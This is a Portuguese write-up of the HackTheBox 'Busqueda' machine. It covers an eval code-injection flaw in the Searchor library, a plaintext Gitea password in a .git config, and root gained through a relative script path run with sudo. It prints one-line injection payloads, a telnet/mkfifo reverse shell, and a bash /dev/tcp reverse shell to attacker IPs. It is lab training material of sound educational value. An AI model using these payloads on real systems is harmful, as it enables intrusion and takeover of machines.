---
title: Busqueda (HTB) / Easy
description: Write-up em português da máquina Busqueda (HackTheBox * Hacker's Wrath)
date: 2023-05-01 09:00:00 -3000
categories: [writeups]
tags: [hackthebox, htb, writeup, easy, machine, linux, code-injection, path-manipulation]
author: tandera
show_image_post: true
---

<img src="/assets/writeups/2023-05-01-busqueda/infocard.png" width=500px alt="infocard Busqueda">

### Conteúdo da máquina

- Injeção de código;
- Credenciais mal-armazenadas;
- Manipulação de um PATH relativo;

### Enumeração

Buscando por serviços, temos:

```
# Nmap 7.93 scan initiated Sun Apr  9 17:30:28 2023 as: nmap -sS -oN nmap.txt 10.10.11.208
Nmap scan report for 10.10.11.208
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Sun Apr  9 17:30:30 2023 -- 1 IP address (1 host up) scanned in 2.45 seconds
```

O SSH está na versão `SSH-2.0-OpenSSH_8.9p1`. Ou seja, nosso ponto de entrada é pela porta 80.

### HTTP

Acessando a página _web_, temos:
<img src="/assets/writeups/2023-05-01-busqueda/website.png" width=600px alt="Página Inicial do Searchor">

Podemos escolher uma _search engine_ qualquer e fazer uma pesquisa, habilitando o redirect ou não. Se olharmos com atenção, porém, podemos ver que no rodapé da página existe uma versão de um programa chamado _Searchor_.

![Versão do Searchor](/assets/writeups/2023-05-01-busqueda/searchor_version.png)]

Pesquisando sobre o programa, descobrimos que é um [projeto Open Source](https://github.com/ArjunSharda/Searchor) hospedado no Github. Vendo o [histórico das versões](https://github.com/ArjunSharda/Searchor/releases), descobrimos que, antes da versão `2.4.2`, o projeto era vulnerável a uma [injeção de código remota](https://github.com/ArjunSharda/Searchor/pull/130/commits/29d5b1f28d29d6a282a5e860d456fab2df24a16b) (RCE) por causa de um `eval` na função _search_:

![Eval vulnerável](/assets/writeups/2023-05-01-busqueda/eval.png)

Sorte ou coincidência, é justamente esse código vulnerável utilizado pela aplicação.

### Injeção de código

Existem algumas restrições para a função eval. A primeira delas é que a expressão não pode conter multiplas linhas, ou seja, nosso payload deve ser escrito numa linha só. A outra restrição é que funções como _import_ devem ser chamadas com essa notação:

```python
eval("__import__('os')")  # dessa forma!
eval("import os")  # dessa NÃO
```

Caso queira entender mais sobre injeção em eval's, clique [aqui](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1).

#### Montando o payload

O código vulnerável possui dois parâmetros ao nosso controle: _engine_ e _query_.
Engine é o mecanismo de busca utilizado, como o Google ou o DuckDuckGo. Não podemos injetar aqui.
A Query é o conteúdo da nossa busca. Pensando da seguinte maneira, conseguimos fazer com que o servidor execute código nosso:

```
' + str(__import__('os').system('curl http://10.10.14.88:8000/')))#
```

Nesse código, nós estamos:

1. Fechando a aspa simples da Query.
2. Concatenando a string vazia com uma nova string.
3. A nova string é o resultado (exit code) da execução de um comando à nossa escolha.
4. Fechando os parenteses necessários e commentando o resto do código.

Na aplicação, nosso código rodaria assim:

```python
url = eval(
  f"Engine.Google.search('' + str(__import__('os').system('curl http://10.10.14.88:8000/')))#, copy_url={copy}, open_web={open})"
)
```

Existem várias formas de conseguir uma reverse shell. Uma delas é pelo _telnet_.

```
' + str(__import__('os').system('TF=$(mktemp -u);mkfifo $TF && telnet 10.10.14.88 4000 0<$TF | bash 1>$TF')))#
```

### Dentro do servidor

Fazendo uma enumeração básica, temos:

- Usuário atual: `svc`
- Versão do Kernel: `5.15.0-69-generic`
- Hosts relacionados ao servidor: `searcher.htb` e `gitea.searcher.htb`
- Usuários _logáveis_: `root` e `svc`

O nosso usuário possui um diretório home. Abrindo-o, temos a primeira flag.

Duas coisas importantes aqui: a primeira delas é que existe um subdomínio _gitea_ nesse servidor. Se adicionarmos ele ao nosso `/etc/hosts`, vemos que é uma página do Gitea. Para acessá-la, precisamos de algumas credenciais.

![Página de login do Gitea](/assets/writeups/2023-05-01-busqueda/gitea_login.png)

No diretório da aplicação (onde a shell "spawnou"), existe a pasta `.git`. Dentro dela, um arquivo `config` tem a senha do usuário `svc` (cody).

```bash
$ cat config
...
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
```

Podemos logar via SSH e logar no Gitea.

### Outro usuário?

Acessando a página do Gitea, vemos que o usuário `administrator` contribuiu no único repositório do Cody: _Searcher Site_. 

![Contribuições no Searcher Site](/assets/writeups/2023-05-01-busqueda/cody_gitea.png)

Mais tarde vamos usar esse usuário.

### Escada até o topo: _sudoers_.

Verificando as permissões com o `sudo -l`, podemos rodar o seguinte comando:

```bash
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Executando o script, temos:

```
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py -h
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Algo simples de se presumir é que esse script interage com o Docker através de comandos de CLI. Pesquisando sobre [docker ps](https://docs.docker.com/engine/reference/commandline/ps/), descobrimos algo que faz a exata mesma função do script. Ou seja, as opções aqui são passadas pelo comando docker. 

Rodando o docker-ps, temos:

```
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                [...]   PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   [...]   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              [...]   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

A-ha! O serviço do `gitea` roda num container docker. Podemos inspecioná-lo com o [_docker-inspect_](https://docs.docker.com/engine/reference/commandline/inspect/#get-a-subsection-in-json-format). Dentro da configuração do docker, vemos uma senha do banco de dados:

![Inspecionando o container do Gitea](/assets/writeups/2023-05-01-busqueda/docker_config.png)

Testando ela, conseguimos o _login_ do `administrator`. 

### Código-fonte do Bunker. 

Vendo os repositórios do `administrator`, achamos um chamado _scripts_. Dentro dele temos todos os arquivos do _system-checkup.py_. 

![Repositório de Scripts](/assets/writeups/2023-05-01-busqueda/scripts.png)

Vendo o arquivo `system-checkup.py`, temos o seguinte trecho: 

```python
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output

# [...]

if action == 'docker-inspect':
  # [...]

elif action == 'docker-ps':
  # [...]

elif action == 'full-checkup':
  try:
    arg_list = ['./full-checkup.sh']
    print(run_command(arg_list))
    print('[+] Done!')
  except:
    print('Something went wrong')
    exit(1)
```

Aqui, nossa saída! Na variável `arg_list` (linha 25), o script procura por um arquivo `./full-checkup.sh`, que é relativo ao local da execução do programa (/home, /tmp, etc.), ou seja, ele está sobre o nosso controle. Assim conseguimos acesso root.

```bash
cd /tmp 
vim full-checkup.sh 
```

Dentro desse arquivo, preparamos nossa _reverse shell_:

```vim
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.78/4444 0>&1
```

Preparamos o ambiente e executamos:
```shell 
(hacker) $ nc -lvp 4444
$ chmod +x full-checkup.sh 
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
# whoami
root
```

Até a próxima!
